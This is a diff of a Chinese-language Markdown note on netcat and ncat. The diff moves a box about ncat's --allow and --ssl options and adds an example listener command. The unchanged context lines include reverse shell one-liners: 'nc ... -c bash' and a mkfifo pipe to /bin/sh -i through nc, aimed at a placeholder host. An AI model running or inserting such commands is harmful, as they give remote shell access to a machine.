@@ -2,6 +2,9 @@
 
 下载地址：<https://nmap.org/download.html>
 
+!!! abstract
+    ncat属于nmap的组件，相比于nc(netcat)，提供`--allow`指定允许连接的机器，`--ssl`进行数据加密。
+
 ## 参数介绍
 
 - -v列出执行过程详细信息
@@ -23,8 +26,8 @@
         - 反向：server`nv -lp 53`执行命令，client`nc -nv x.x.x.x 53 -c bash`被执行命令。
         - server`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l x.x.x.x 1234 > /tmp/f`被执行命令, client`nc x.x.x.x 1234`执行命令
 
-!!! abstract
-    ncat属于nmap的组件，相比于nc(netcat)，提供`--allow`指定允许连接的机器，`--ssl`进行数据加密。
+!!! example "典型应用: `nc -lvv 8887`"
+
 
 !!! quote "参考链接"
     <https://blog.csdn.net/fageweiketang/article/details/82833193>
